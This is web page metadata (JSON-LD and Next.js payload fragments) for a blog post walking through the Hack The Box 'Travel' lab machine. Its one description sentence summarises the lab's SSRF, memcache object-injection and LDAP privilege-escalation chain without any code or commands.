+14:T58a,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-travel-walkthrough/#article","headline":"Hack The Box: Travel Walkthrough","description":"An exposed Git repository documented an SSRF chain that poisoned memcache with a PHP object for code execution, a forgotten database backup yielded lynik-admin's SSH password, and LDAP write access added a sudo-group user with an attacker key.","url":"https://cyberkareem.com/writing/hackthebox-travel-walkthrough/","datePublished":"2026-06-11T10:54:17.000Z","dateModified":"2026-06-11T10:54:17.000Z","wordCount":3493,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/3aee13cd377cbe7fe3c4c69c628157d7840f7800/HTB-Travel.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/social/v2/writing/hackthebox-travel-walkthrough.png","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-travel-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Travel Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-travel-walkthrough/"}]}]}f:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$14"}}]
+10:["$","$L15",null,{"children":["$","$16",null,{"name":"Next.MetadataOutlet","children":"$@17"}]}]
+17:null
